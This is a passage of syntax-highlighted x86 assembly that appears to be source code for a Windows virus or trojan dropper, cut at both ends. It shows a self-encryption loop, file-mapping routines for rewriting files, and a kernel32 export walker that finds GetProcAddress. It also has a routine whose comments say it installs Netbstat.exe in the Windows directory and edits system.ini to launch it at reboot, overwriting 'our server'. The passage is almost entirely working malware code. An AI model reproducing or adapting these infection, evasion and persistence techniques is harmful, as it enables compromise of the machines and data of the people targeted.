</span><span class="sc5">loop_encrypt</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">96291273h</span><span class="sc0">
</span><span class="sc5">key_dword</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">19h</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">loop_encrypt</span><span class="sc0">

                </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">align_proc</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">map_view</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; file size</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle_mapping</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapViewOfFile</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">create_mapp</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; file size</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle_new_file</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CreateFileMappingA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">unmap_file</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_addr</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">UnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">close_map_hnd</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle_mapping</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">close_cre_hnd</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle_new_file</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;************************************************************</span><span class="sc0">
</span><span class="sc1">;                               *</span><span class="sc0">
</span><span class="sc1">;             FROM LORD JULUS (c)           *</span><span class="sc0">
</span><span class="sc1">;                               *</span><span class="sc0">
</span><span class="sc1">;************************************************************</span><span class="sc0">

</span><span class="sc5">my_GetProc</span><span class="sc4">:</span><span class="sc0"> 
        </span><span class="sc6">pushad</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; save the kernel base</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">                    </span><span class="sc1">; is it an exe?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">notfoundgpa</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                            </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">notfoundgpa</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                            </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0">                    </span><span class="sc1">; is it a PE?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">notfoundgpa</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                            </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_HEADER_SIZE</span><span class="sc0">             </span><span class="sc1">; skip file header</span><span class="sc0">
                                                            </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.OH_DataDirectory.DE_Export.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">; and get export RVA</span><span class="sc0">
                                                            </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.ED_NumberOfNames</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; save number of names</span><span class="sc0">
                                                            </span><span class="sc1">; to look into</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.ED_AddressOfNames</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; get address of names</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">; align to base rva</span><span class="sc0">
                                                            </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                    </span><span class="sc1">; save pointer to export</span><span class="sc0">
                                                            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">gpa_locate_loop</span><span class="sc4">:</span><span class="sc0">                                            </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                              </span><span class="sc1">; get one name address</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">; and align it</span><span class="sc0">
                                                            </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">; save counter and addr.</span><span class="sc0">
                                                            </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                </span><span class="sc1">; compare to GetProcAddress</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">getprocaddresslen</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">foundgpa</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
                                                            </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">; restore them</span><span class="sc0">
                                                            </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">; and get next name</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">gpa_locate_loop</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
                                                            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">notfoundgpa</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">; we didn't find it...</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; mark failure</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                                                            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">foundgpa</span><span class="sc4">:</span><span class="sc0">                                                   </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">; ecx = how many did we</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                     </span><span class="sc1">; check from total, but</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.ED_NumberOfNames</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; we need the reminder</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                     </span><span class="sc1">; of the search</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.ED_AddressOfOrdinals</span><span class="sc4">]</span><span class="sc1">; get address of ordinals</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                                  </span><span class="sc1">; and look using the index</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; take the ordinal</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.ED_AddressOfFunctions</span><span class="sc4">]</span><span class="sc1">; take address of funcs.</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                                  </span><span class="sc1">; we look in a dword array</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">; go to the function addr</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                              </span><span class="sc1">; take it's address</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">; and align it to k32 base</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dr0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; save it in dr0</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">                                       </span><span class="sc1">; restore all regs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dr0</span><span class="sc0">                                </span><span class="sc1">; and mark success</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">                                         </span><span class="sc1">; </span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc5">check_install_net</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; Install Netbstat.exe in Windows directory and</span><span class="sc0">
        </span><span class="sc1">; modify system.ini to execute at the next reboot.</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetCommandLineA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">cmd_line</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">208h</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">path_name</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetWindowsDirectoryA</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">file_in_use</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">path_name@@</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">260</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">path_name@@</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">_@13@</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">_@13@</span><span class="sc0">

        </span><span class="sc1">; insert "\",00h in the path</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">005Ch</span><span class="sc0">

        </span><span class="sc1">; point edi for System.ini string</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Netbstat</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc1">; And add to path</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">path_name</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">_@1@@</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">_@1@@</span><span class="sc0">

        </span><span class="sc1">; insert "\",00h in the path</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">005Ch</span><span class="sc0">

        </span><span class="sc1">; point edi for System.ini string</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">System_ini</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc1">; And add to path</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0Bh</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc1">; Process our command Line</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetCommandLineA</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">check_char</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">22h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">replace_char</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">check_char</span><span class="sc0">

</span><span class="sc5">replace_char</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">from_line</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">260</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc1">; Try to overwrite our server if isn't running</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">path_name@@</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">from_line</span><span class="sc4">]</span><span class="sc0">
